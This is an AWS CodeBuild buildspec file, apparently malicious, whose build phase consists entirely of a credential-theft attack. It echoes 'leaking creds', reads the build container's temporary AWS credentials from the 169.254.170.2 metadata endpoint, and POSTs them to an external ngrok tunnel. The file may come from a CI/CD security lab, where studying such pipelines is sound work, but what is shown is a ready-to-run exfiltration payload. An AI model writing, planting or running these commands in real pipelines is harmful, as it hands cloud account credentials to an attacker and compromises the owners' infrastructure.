version: 0.2

phases:
  build:
    commands:
      - echo "leaking creds"
      - CREDS=$(curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
      - curl -X POST -d "$CREDS" http://2.tcp.ngrok.io:21364
